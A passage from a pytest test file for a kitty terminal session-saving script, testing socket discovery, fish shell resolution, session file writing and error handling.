        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(one_tab_ls_output("/work")))
        target = tmp_path / "last-session.conf"

        ks.save_snapshot(target)

        (line,) = launch_lines(target.read_text(encoding="utf-8"))
        assert shlex.split(line) == [
            "launch",
            "--cwd",
            "/repo",
            SHELL,
            "-C",
            f"claude --resume {SESSION_ID}",
        ]

    def test_home_directory_is_the_last_cwd_fallback(
        self, ks: ModuleType, home_dir: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        window: dict[str, object] = {"id": 1}
        output = json.dumps(single_tab_os_window(make_tab([window])))
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(output))
        target = tmp_path / "last-session.conf"

        ks.save_snapshot(target)

        (line,) = launch_lines(target.read_text(encoding="utf-8"))
        assert shlex.split(line) == ["launch", "--cwd", str(home_dir), SHELL]

    def test_default_target_is_the_kitty_config_directory_under_home(
        self, ks: ModuleType, home_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(one_tab_ls_output()))
        monkeypatch.setattr(ks, "read_claude_session", lambda _pid: None)

        ks.save_snapshot()

        assert (home_dir / ".config" / "kitty" / "last-session.conf").is_file()

    @pytest.mark.parametrize("run", [*KITTY_LS_COMMAND_FAILURES, *KITTY_LS_NOT_A_LIST])
    def test_kitty_ls_failure_leaves_the_existing_file_byte_for_byte_unchanged(
        self,
        ks: ModuleType,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        run: Callable[..., subprocess.CompletedProcess[str]],
    ) -> None:
        target = tmp_path / "last-session.conf"
        previous = b"new_tab keep\r\nlaunch --cwd /old fish\n\xff"
        target.write_bytes(previous)
        monkeypatch.setattr(ks.subprocess, "run", run)

        with pytest.raises(ks.SnapshotError):
            ks.save_snapshot(target)

        assert target.read_bytes() == previous
        assert list(tmp_path.iterdir()) == [target]

    def test_read_os_windows_raising_snapshot_error_leaves_the_file_unchanged(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        target = tmp_path / "last-session.conf"
        target.write_bytes(b"previous")

        def failing() -> list[object]:
            message = "no remote control"
            raise ks.SnapshotError(message)

        monkeypatch.setattr(ks, "read_os_windows", failing)

        with pytest.raises(ks.SnapshotError, match="no remote control"):
            ks.save_snapshot(target)

        assert target.read_bytes() == b"previous"

    @pytest.mark.parametrize(
        "os_windows",
        [
            pytest.param([], id="no-os-windows"),
            pytest.param([{"is_focused": True, "tabs": []}], id="no-tabs"),
            pytest.param([{"is_focused": True, "tabs": [{"windows": []}]}], id="empty-tab"),
        ],
    )
    def test_nothing_to_save_leaves_the_existing_file_unchanged(
        self,
        ks: ModuleType,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        os_windows: list[object],
    ) -> None:
        target = tmp_path / "last-session.conf"
        target.write_bytes(b"previous")
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(json.dumps(os_windows)))

        with pytest.raises(ks.SnapshotError):
            ks.save_snapshot(target)

        assert target.read_bytes() == b"previous"

    def test_write_failure_becomes_a_snapshot_error_naming_the_path(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(one_tab_ls_output()))
        monkeypatch.setattr(ks, "read_claude_session", lambda _pid: None)
        blocker = tmp_path / "blocker"
        blocker.write_text("a file where a directory is needed", encoding="utf-8")
        target = blocker / "last-session.conf"

        with pytest.raises(ks.SnapshotError) as excinfo:
            ks.save_snapshot(target)

        assert str(target) in str(excinfo.value)
        assert isinstance(excinfo.value.__cause__, OSError)

    def test_failed_write_keeps_the_previous_snapshot(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(one_tab_ls_output()))
        monkeypatch.setattr(ks, "read_claude_session", lambda _pid: None)
        target = tmp_path / "last-session.conf"
        target.write_bytes(b"previous")

        def failing_fsync(_descriptor: int) -> None:
            message = "disk full"
            raise OSError(message)

        monkeypatch.setattr(ks.os, "fsync", failing_fsync)

        with pytest.raises(ks.SnapshotError):
            ks.save_snapshot(target)

        assert target.read_bytes() == b"previous"
        assert list(tmp_path.iterdir()) == [target]


class TestMain:
    def test_success_reports_the_tab_count_and_path(
        self,
        ks: ModuleType,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        monkeypatch.setattr(ks, "save_snapshot", lambda: 3)

        status = ks.main()

        captured = capsys.readouterr()
        assert status == 0
        assert captured.out == f"Saved 3 tab(s) to {ks.SESSION_FILE}\n"
        assert captured.err == ""

    def test_failure_prints_the_error_to_stderr_and_returns_one(
        self,
        ks: ModuleType,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        def failing() -> int:
            message = "boom"
            raise ks.SnapshotError(message)

        monkeypatch.setattr(ks, "save_snapshot", failing)

        status = ks.main()

        captured = capsys.readouterr()
        assert status == 1
        assert captured.out == ""
        assert captured.err == "kitty-save-session: boom\n"

    @pytest.mark.usefixtures("inside_kitty")
    def test_kitty_without_remote_control_prints_the_config_hint(
        self,
        ks: ModuleType,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_raising(FileNotFoundError("kitty")))

        status = ks.main()

        captured = capsys.readouterr()
        assert status == 1
        assert captured.err.startswith("kitty-save-session: ")
        assert "allow_remote_control" in captured.err
        assert captured.out == ""
        assert not ks.SESSION_FILE.exists()

    @pytest.mark.usefixtures("inside_kitty", "fixed_fish")
    def test_main_writes_the_session_file_under_the_home_directory(
        self,
        ks: ModuleType,
        home_dir: Path,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(one_tab_ls_output("/work")))

        status = ks.main()

        expected_path = home_dir / ".config" / "kitty" / "last-session.conf"
        assert status == 0
        assert expected_path == ks.SESSION_FILE
        assert capsys.readouterr().out == f"Saved 1 tab(s) to {expected_path}\n"
        assert expected_path.read_text(encoding="utf-8").startswith("new_tab main\n")


KITTY_CONF = REPO_ROOT / "roles/devbox/files/.config/kitty/kitty.conf"
OLDER_MTIME = 1_000
NEWER_MTIME = 2_000
KITTY_ON_PATH = "/opt/test/kitty"


SOCKET_MTIMES: dict[Path, int] = {}


# A sandboxed or unprivileged runner may not create unix sockets, and a pytest
# temporary path can exceed the socket path limit, so the filesystem reports the
# registered files as sockets and every other path keeps its real status.
@pytest.fixture(autouse=True)
def socket_status(monkeypatch: pytest.MonkeyPatch) -> None:
    SOCKET_MTIMES.clear()
    real_lstat = Path.lstat

    def lstat(path: Path) -> os.stat_result:
        if path in SOCKET_MTIMES:
            return os.stat_result(
                (stat.S_IFSOCK | 0o600, 0, 0, 1, 0, 0, 0, 0, SOCKET_MTIMES[path], 0)
            )
        return real_lstat(path)

    monkeypatch.setattr(Path, "lstat", lstat)


def make_socket(directory: Path, name: str, mtime: int) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / name
    path.touch()
    SOCKET_MTIMES[path] = mtime
    return path


class FakeKitty:
    def __init__(self, answers: dict[Path, object]) -> None:
        self.answers = answers
        self.calls: list[list[str]] = []
        self.options: list[dict[str, object]] = []

    def __call__(self, command: list[str], **kwargs: object) -> subprocess.CompletedProcess[str]:
        self.calls.append(command)
        self.options.append(kwargs)
        outcome = self.answers[Path(command[3].removeprefix("unix:"))]
        if isinstance(outcome, Exception):
            raise outcome
        return subprocess.CompletedProcess(command, 0, stdout=str(outcome), stderr="")


def refused(socket_path: Path) -> subprocess.CalledProcessError:
    return subprocess.CalledProcessError(1, ["kitty", "@", "--to", f"unix:{socket_path}", "ls"])


@pytest.fixture
def kitty_on_path(ks: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(ks.shutil, "which", lambda name: KITTY_ON_PATH if name == "kitty" else None)


class TestReadOsWindowsOutsideKitty:
    @pytest.mark.usefixtures("kitty_on_path")
    def test_a_refusing_newer_socket_falls_back_to_the_older_one(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        older = make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        newer = make_socket(tmp_path, "kitty-2.sock", NEWER_MTIME)
        fake = FakeKitty({newer: refused(newer), older: '[{"id": 7}]'})
        monkeypatch.setattr(ks.subprocess, "run", fake)

        windows = ks.read_os_windows(tmp_path)

        assert windows == [{"id": 7}]
        assert fake.calls == [
            [KITTY_ON_PATH, "@", "--to", f"unix:{newer}", "ls"],
            [KITTY_ON_PATH, "@", "--to", f"unix:{older}", "ls"],
        ]
        assert all(options["timeout"] == 2 for options in fake.options)
        assert all(options["check"] is True for options in fake.options)

    def test_the_newest_answering_socket_is_the_only_one_asked(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        older = make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        newer = make_socket(tmp_path, "kitty-2.sock", NEWER_MTIME)
        fake = FakeKitty({newer: '[{"id": 2}]', older: '[{"id": 1}]'})
        monkeypatch.setattr(ks.subprocess, "run", fake)

        assert ks.read_os_windows(tmp_path) == [{"id": 2}]
        assert [call[3] for call in fake.calls] == [f"unix:{newer}"]

    def test_files_that_are_not_sockets_are_never_asked(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        live = make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        regular = tmp_path / "kitty-9.sock"
        regular.write_text("not a socket", encoding="utf-8")
        directory = tmp_path / "kitty-8.sock.d"
        directory.mkdir()
        (tmp_path / "kitty-7.sock").symlink_to(live)
        for entry in (regular, directory):
            os.utime(entry, (NEWER_MTIME, NEWER_MTIME))
        assert tmp_path.joinpath("kitty-9.sock").lstat().st_mtime == NEWER_MTIME
        fake = FakeKitty({live: '[{"id": 1}]'})
        monkeypatch.setattr(ks.subprocess, "run", fake)

        assert ks.read_os_windows(tmp_path) == [{"id": 1}]
        assert [call[3] for call in fake.calls] == [f"unix:{live}"]

    @pytest.mark.parametrize("layout", ["missing", "empty", "only-non-sockets"])
    def test_no_socket_means_kitty_is_not_running(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, layout: str
    ) -> None:
        directory = tmp_path / "sockets"
        if layout != "missing":
            directory.mkdir()
        if layout == "only-non-sockets":
            (directory / "kitty-1.sock").write_text("x", encoding="utf-8")
        fake = FakeKitty({})
        monkeypatch.setattr(ks.subprocess, "run", fake)

        with pytest.raises(ks.KittyNotRunningError):
            ks.read_os_windows(directory)

        assert fake.calls == []

    def test_kitty_not_running_is_a_snapshot_error(self, ks: ModuleType, tmp_path: Path) -> None:
        with pytest.raises(ks.SnapshotError):
            ks.read_os_windows(tmp_path / "absent")

    def test_every_socket_refusing_means_kitty_is_not_running(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        older = make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        newer = make_socket(tmp_path, "kitty-2.sock", NEWER_MTIME)
        fake = FakeKitty({older: refused(older), newer: refused(newer)})
        monkeypatch.setattr(ks.subprocess, "run", fake)

        with pytest.raises(ks.KittyNotRunningError):
            ks.read_os_windows(tmp_path)

        assert len(fake.calls) == 2

    @pytest.mark.parametrize("run", KITTY_LS_COMMAND_FAILURES)
    def test_any_failure_of_the_only_socket_means_kitty_is_not_running(
        self,
        ks: ModuleType,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        run: Callable[..., subprocess.CompletedProcess[str]],
    ) -> None:
        make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        monkeypatch.setattr(ks.subprocess, "run", run)

        with pytest.raises(ks.KittyNotRunningError):
            ks.read_os_windows(tmp_path)

    @pytest.mark.parametrize("answer", ['{"tabs": []}', '"text"', "null"])
    def test_a_socket_answering_something_other_than_a_list_is_a_snapshot_error(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, answer: str
    ) -> None:
        live = make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        monkeypatch.setattr(ks.subprocess, "run", FakeKitty({live: answer}))

        with pytest.raises(ks.SnapshotError, match="list") as excinfo:
            ks.read_os_windows(tmp_path)

        assert not isinstance(excinfo.value, ks.KittyNotRunningError)

    def test_kitty_missing_from_path_is_run_from_the_application_bundle(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        live = make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        fake = FakeKitty({live: "[]"})
        monkeypatch.setattr(ks.subprocess, "run", fake)
        monkeypatch.setattr(ks.shutil, "which", lambda _name: None)

        ks.read_os_windows(tmp_path)

        assert fake.calls[0][0] == ks.KITTY_APP_EXECUTABLE
        assert ks.KITTY_APP_EXECUTABLE == "/Applications/kitty.app/Contents/MacOS/kitty"

    @pytest.mark.usefixtures("kitty_on_path")
    def test_kitty_on_path_is_preferred_to_the_application_bundle(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        live = make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        fake = FakeKitty({live: "[]"})
        monkeypatch.setattr(ks.subprocess, "run", fake)

        ks.read_os_windows(tmp_path)

        assert fake.calls[0][0] == KITTY_ON_PATH

    @pytest.mark.usefixtures("inside_kitty")
    def test_inside_kitty_the_sockets_are_ignored(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        make_socket(tmp_path, "kitty-1.sock", OLDER_MTIME)
        calls: list[list[str]] = []

        def run(command: list[str], **_kwargs: object) -> subprocess.CompletedProcess[str]:
            calls.append(command)
            return subprocess.CompletedProcess(command, 0, stdout="[]", stderr="")

        monkeypatch.setattr(ks.subprocess, "run", run)

        ks.read_os_windows(tmp_path)

        assert calls == [["kitty", "@", "ls"]]

    def test_the_default_socket_directory_is_kittys_state_directory_under_home(
        self, ks: ModuleType, home_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        live = make_socket(home_dir / ".local" / "state" / "kitty", "kitty-5.sock", OLDER_MTIME)
        fake = FakeKitty({live: '[{"id": 5}]'})
        monkeypatch.setattr(ks.subprocess, "run", fake)

        expected_directory = home_dir / ".local" / "state" / "kitty"
        assert expected_directory == ks.SOCKET_DIR
        assert ks.read_os_windows() == [{"id": 5}]

    def test_the_socket_directory_is_the_one_kitty_conf_listens_in(self, ks: ModuleType) -> None:
        (listen_on,) = [
            line.split(maxsplit=1)[1].strip()
            for line in KITTY_CONF.read_text(encoding="utf-8").splitlines()
            if line.startswith("listen_on ")
        ]

        assert listen_on.startswith("unix:${HOME}/")
        socket_path = Path(os.path.expandvars(listen_on.removeprefix("unix:")))
        assert socket_path.parent == ks.SOCKET_DIR
        assert "{kitty_pid}" in socket_path.name


def fish_at(directory: Path, name: str = "fish", mode: int = 0o755) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / name
    path.write_text("#!/bin/sh\n", encoding="utf-8")
    path.chmod(mode)
    return path


def relative_fish(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    monkeypatch.chdir(fish_at(tmp_path / "cwd").parent)
    return "fish"


def misnamed_fish(tmp_path: Path, _monkeypatch: pytest.MonkeyPatch) -> str:
    return str(fish_at(tmp_path / "misnamed", "fishy"))


def missing_fish(tmp_path: Path, _monkeypatch: pytest.MonkeyPatch) -> str:
    return str(tmp_path / "gone" / "fish")


def unexecutable_fish(tmp_path: Path, _monkeypatch: pytest.MonkeyPatch) -> str:
    return str(fish_at(tmp_path / "plain", mode=0o644))


def directory_named_fish(tmp_path: Path, _monkeypatch: pytest.MonkeyPatch) -> str:
    directory = tmp_path / "dir" / "fish"
    directory.mkdir(parents=True)
    return str(directory)


UNUSABLE_FISH = [
    pytest.param(relative_fish, id="relative"),
    pytest.param(misnamed_fish, id="not-named-fish"),
    pytest.param(missing_fish, id="missing"),
    pytest.param(unexecutable_fish, id="not-executable"),
    pytest.param(directory_named_fish, id="directory"),
]


@pytest.fixture
def no_fish_anywhere(ks: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(ks, "FISH_LOCATIONS", ())
    monkeypatch.setattr(ks.shutil, "which", lambda _name: None)
    monkeypatch.setattr(ks.pwd, "getpwuid", lambda _uid: types.SimpleNamespace(pw_shell="/bin/zsh"))


def login_shell(ks: ModuleType, monkeypatch: pytest.MonkeyPatch, shell: str) -> None:
    monkeypatch.setattr(ks.pwd, "getpwuid", lambda _uid: types.SimpleNamespace(pw_shell=shell))


@pytest.mark.usefixtures("no_fish_anywhere")
class TestResolveFish:
    def test_a_fish_login_shell_wins_over_every_other_candidate(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        login = fish_at(tmp_path / "login")
        location = fish_at(tmp_path / "location")
        on_path = fish_at(tmp_path / "path")
        login_shell(ks, monkeypatch, str(login))
        monkeypatch.setattr(ks, "FISH_LOCATIONS", (str(location),))
        monkeypatch.setattr(ks.shutil, "which", lambda _name: str(on_path))

        assert ks.resolve_fish() == str(login)

    def test_a_login_shell_other_than_fish_falls_through_to_the_first_existing_location(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        zsh = fish_at(tmp_path / "bin", "zsh")
        first = fish_at(tmp_path / "first")
        second = fish_at(tmp_path / "second")
        login_shell(ks, monkeypatch, str(zsh))
        monkeypatch.setattr(
            ks, "FISH_LOCATIONS", (str(tmp_path / "absent" / "fish"), str(first), str(second))
        )

        assert ks.resolve_fish() == str(first)

    def test_a_location_wins_over_fish_found_on_path(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        location = fish_at(tmp_path / "location")
        on_path = fish_at(tmp_path / "path")
        monkeypatch.setattr(ks, "FISH_LOCATIONS", (str(location),))
        monkeypatch.setattr(ks.shutil, "which", lambda _name: str(on_path))

        assert ks.resolve_fish() == str(location)

    def test_fish_on_path_is_the_last_resort(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        on_path = fish_at(tmp_path / "path")
        monkeypatch.setattr(ks.shutil, "which", lambda _name: str(on_path))

        assert ks.resolve_fish() == str(on_path)

    def test_a_login_shell_of_a_user_missing_from_the_password_database_is_skipped(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        location = fish_at(tmp_path / "location")

        def missing_user(uid: int) -> object:
            raise KeyError(uid)

        monkeypatch.setattr(ks.pwd, "getpwuid", missing_user)
        monkeypatch.setattr(ks, "FISH_LOCATIONS", (str(location),))

        assert ks.resolve_fish() == str(location)

    @pytest.mark.parametrize("unusable", UNUSABLE_FISH)
    def test_an_unusable_login_shell_is_skipped(
        self,
        ks: ModuleType,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        unusable: Callable[[Path, pytest.MonkeyPatch], str],
    ) -> None:
        good = fish_at(tmp_path / "good")
        login_shell(ks, monkeypatch, unusable(tmp_path, monkeypatch))
        monkeypatch.setattr(ks, "FISH_LOCATIONS", (str(good),))

        assert ks.resolve_fish() == str(good)

    @pytest.mark.parametrize("unusable", UNUSABLE_FISH)
    def test_an_unusable_location_is_skipped(
        self,
        ks: ModuleType,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        unusable: Callable[[Path, pytest.MonkeyPatch], str],
    ) -> None:
        good = fish_at(tmp_path / "good")
        monkeypatch.setattr(ks, "FISH_LOCATIONS", (unusable(tmp_path, monkeypatch), str(good)))

        assert ks.resolve_fish() == str(good)

    @pytest.mark.parametrize("unusable", UNUSABLE_FISH)
    def test_an_unusable_fish_on_path_is_not_returned(
        self,
        ks: ModuleType,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        unusable: Callable[[Path, pytest.MonkeyPatch], str],
    ) -> None:
        found = unusable(tmp_path, monkeypatch)
        monkeypatch.setattr(ks.shutil, "which", lambda _name: found)

        with pytest.raises(ks.SnapshotError, match="fish"):
            ks.resolve_fish()

    def test_no_candidate_at_all_raises_a_snapshot_error(self, ks: ModuleType) -> None:
        with pytest.raises(ks.SnapshotError, match="fish"):
            ks.resolve_fish()

    @pytest.mark.usefixtures("inside_kitty")
    def test_without_fish_the_existing_session_file_is_left_unchanged(
        self, ks: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(one_tab_ls_output()))
        target = tmp_path / "last-session.conf"
        target.write_bytes(b"previous")

        with pytest.raises(ks.SnapshotError, match="fish"):
            ks.save_snapshot(target)

        assert target.read_bytes() == b"previous"
        assert list(tmp_path.iterdir()) == [target]

    @pytest.mark.usefixtures("inside_kitty")
    def test_without_fish_main_reports_it_and_keeps_the_session_file(
        self,
        ks: ModuleType,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        monkeypatch.setattr(ks.subprocess, "run", kitty_ls_returning(one_tab_ls_output()))
        ks.SESSION_FILE.parent.mkdir(parents=True)
        ks.SESSION_FILE.write_bytes(b"previous")

        status = ks.main()

        captured = capsys.readouterr()
        assert status == 1
        assert captured.out == ""
        assert captured.err.startswith("kitty-save-session: ")
        assert "fish" in captured.err
        assert ks.SESSION_FILE.read_bytes() == b"previous"


@pytest.mark.usefixtures("fixed_fish")
class TestMainOutsideKitty:
    @pytest.fixture
    def previous_snapshot(self, ks: ModuleType) -> bytes:
        previous = b"new_tab keep\r\nlaunch --cwd /old fish\n\xff"
        ks.SESSION_FILE.parent.mkdir(parents=True)
        ks.SESSION_FILE.write_bytes(previous)
        return previous

    @pytest.mark.parametrize("stale_socket", [False, True], ids=["no-socket", "stale-socket"])
    def test_no_kitty_answering_is_a_silent_success_that_keeps_the_snapshot(
        self,
        ks: ModuleType,
        previous_snapshot: bytes,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
        *,
        stale_socket: bool,
    ) -> None:
        answers: dict[Path, object] = {}
        if stale_socket:
            stale = make_socket(ks.SOCKET_DIR, "kitty-1.sock", OLDER_MTIME)
            answers[stale] = refused(stale)
        monkeypatch.setattr(ks.subprocess, "run", FakeKitty(answers))

        status = ks.main()

        captured = capsys.readouterr()
        assert status == 0
        assert captured.out == ""
        assert captured.err == ""
        assert ks.SESSION_FILE.read_bytes() == previous_snapshot
        assert list(ks.SESSION_FILE.parent.iterdir()) == [ks.SESSION_FILE]

    def test_a_live_socket_without_tabs_fails_loudly_and_keeps_the_snapshot(
        self,
        ks: ModuleType,
        previous_snapshot: bytes,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        live = make_socket(ks.SOCKET_DIR, "kitty-1.sock", OLDER_MTIME)
        answer = json.dumps([{"is_focused": True, "tabs": []}])
        monkeypatch.setattr(ks.subprocess, "run", FakeKitty({live: answer}))

        status = ks.main()

        captured = capsys.readouterr()
        assert status == 1
        assert captured.out == ""
        assert captured.err.startswith("kitty-save-session: ")
        assert "no tabs" in captured.err
        assert ks.SESSION_FILE.read_bytes() == previous_snapshot

    def test_a_live_socket_with_a_tab_saves_it(
        self,
        ks: ModuleType,
        previous_snapshot: bytes,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        live = make_socket(ks.SOCKET_DIR, "kitty-1.sock", OLDER_MTIME)
        monkeypatch.setattr(ks.subprocess, "run", FakeKitty({live: one_tab_ls_output("/work")}))

        status = ks.main()

        assert previous_snapshot != ks.SESSION_FILE.read_bytes()
        assert status == 0
        assert capsys.readouterr().out == f"Saved 1 tab(s) to {ks.SESSION_FILE}\n"
        assert ks.SESSION_FILE.read_text(encoding="utf-8") == (
            f"new_tab main\nlayout splits\nlaunch --cwd /work {SHELL}\n"
        )
